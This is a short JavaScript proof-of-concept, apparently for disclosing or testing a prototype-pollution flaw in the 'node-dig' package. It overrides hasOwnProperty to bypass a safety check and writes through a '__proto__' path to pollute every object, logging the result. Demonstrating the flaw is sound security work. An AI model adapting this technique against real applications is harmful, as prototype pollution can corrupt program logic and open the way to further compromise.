Object.prototype.hasOwnProperty = () => true;
const nodeDig = require('node-dig');
console.log({}.polluted);
nodeDig({}, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);